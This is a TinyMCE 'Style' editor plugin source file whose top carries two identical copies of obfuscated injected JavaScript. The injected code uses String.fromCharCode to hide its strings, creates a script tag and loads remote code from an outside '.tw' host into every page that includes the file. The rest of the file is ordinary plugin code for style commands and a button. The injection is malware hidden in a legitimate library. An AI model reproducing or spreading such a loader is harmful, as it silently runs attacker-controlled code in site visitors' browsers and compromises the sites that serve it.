Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * editor_plugin_src.js
 *
 * Copyright 2009, Moxiecode Systems AB
 * Released under LGPL License.
 *
 * License: http://tinymce.moxiecode.com/license
 * Contributing: http://tinymce.moxiecode.com/contributing
 */

(function() {
	tinymce.create('tinymce.plugins.StylePlugin', {
		init : function(ed, url) {
			// Register commands
			ed.addCommand('mceStyleProps', function() {

				var applyStyleToBlocks = false;
				var blocks = ed.selection.getSelectedBlocks();
				var styles = [];

				if (blocks.length === 1) {
					styles.push(ed.selection.getNode().style.cssText);
				}
				else {
					tinymce.each(blocks, function(block) {
						styles.push(ed.dom.getAttrib(block, 'style'));
					});
					applyStyleToBlocks = true;
				}

				ed.windowManager.open({
					file : url + '/props.htm',
					width : 480 + parseInt(ed.getLang('style.delta_width', 0)),
					height : 340 + parseInt(ed.getLang('style.delta_height', 0)),
					inline : 1
				}, {
					applyStyleToBlocks : applyStyleToBlocks,
					plugin_url : url,
					styles : styles
				});
			});

			ed.addCommand('mceSetElementStyle', function(ui, v) {
				if (e = ed.selection.getNode()) {
					ed.dom.setAttrib(e, 'style', v);
					ed.execCommand('mceRepaint');
				}
			});

			ed.onNodeChange.add(function(ed, cm, n) {
				cm.setDisabled('styleprops', n.nodeName === 'BODY');
			});

			// Register buttons
			ed.addButton('styleprops', {title : 'style.desc', cmd : 'mceStyleProps'});
		},

		getInfo : function() {
			return {
				longname : 'Style',
				author : 'Moxiecode Systems AB',
				authorurl : 'http://tinymce.moxiecode.com',
				infourl : 'http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/style',
				version : tinymce.majorVersion + "." + tinymce.minorVersion
			};
		}
	});

	// Register plugin
	tinymce.PluginManager.add('style', tinymce.plugins.StylePlugin);
})();
